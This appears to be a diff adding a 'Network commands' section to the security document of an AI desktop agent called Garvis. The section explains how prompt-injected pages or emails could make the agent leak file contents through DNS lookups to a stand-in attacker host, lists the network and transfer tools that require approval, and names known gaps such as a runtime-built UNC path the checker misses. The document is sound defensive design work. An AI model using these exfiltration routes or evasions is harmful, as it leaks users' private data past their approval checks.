@@ -58,6 +58,52 @@ Out of scope:
   as enabling the phone interface on an untrusted network or widening
   `GARVIS_MOBILE_ALLOWED_NETWORKS`.
 
+## Network commands
+
+A read-only command can still leak data: `nslookup <data>.evil.example`
+sends whatever is in `<data>` to the attacker's DNS server. Prompt-injected
+text (a web page, an email, OCR output) could ask the agent to read a file
+and send it out this way. So:
+
+- **PowerShell lookups and pings ask first** (`nslookup`, `ping`,
+  `tracert`, `pathping`, `Resolve-DnsName`, `Test-Connection`,
+  `Test-NetConnection`). The exception is a fixed target: loopback, or a
+  short list of well-known public hosts (`8.8.8.8`, `1.1.1.1`,
+  `google.com`, `cloudflare.com`, `microsoft.com`, ...) with only numeric
+  or one-word options. Names on that list carry no data, and an attacker
+  can't see traffic to them. Private LAN addresses also ask, because on
+  shared Wi-Fi another device can own one. Targets from variables,
+  sub-expressions or piped input always ask.
+- **Other ways a command reaches another computer also ask:** UNC paths
+  (`\\host\share`, `//host`), any URL, remote parameters (`-ComputerName`
+  and its abbreviations, `-CimSession`, `-Server`, `/s` on `systeminfo` and
+  `tasklist`), splatted parameters, `netsh -r`, `npm view`, `winget
+  search`, `Find-Module`, and web or transfer tools (`curl`, `iwr`, `bitsadmin`, ...).
+- **Model-written web addresses after reading your data ask first.** Once
+  the conversation holds output from a tool that reads your own data
+  (files, PowerShell, email, the screen, ...), `fetch_webpage_text`,
+  `browser_navigate` and `open_website` ask before opening a URL that Garvis
+  composed itself. A URL that appeared in your messages or in a search
+  result or page Garvis read doesn't ask, and neither does a bare site
+  (`https://host/`) whose name appeared there. Without private data in the
+  conversation, browsing is unchanged.
+- Approval comes only from you: the desktop dialog or a paired phone. The
+  model never sees a pending request's id and has no tool that can answer
+  it, so text in a page or file can't approve itself.
+
+Accepted risks:
+
+- A UNC path built at runtime (for example `('\' * 2) + 'host\x'` passed to
+  `Get-Content`) isn't recognised. The command checker reads literal text,
+  so it can't see such a path.
+- Typing into a web form (`browser_type`, then Enter on a form that looks
+  like a search) and desktop typing aren't covered by the address rule.
+- A page can list many links and have the model pick among them, leaking a
+  little data through which links it picks. Each pick is a separate call,
+  so the per-turn step limit keeps this slow.
+- Your remembered facts and the live desktop context are in the system
+  prompt. They don't count as private data for the address rule.
+
 ## If you run Garvis
 
 - Keep your `.env`, `config/gmail_client_secret.json` and the `data/`
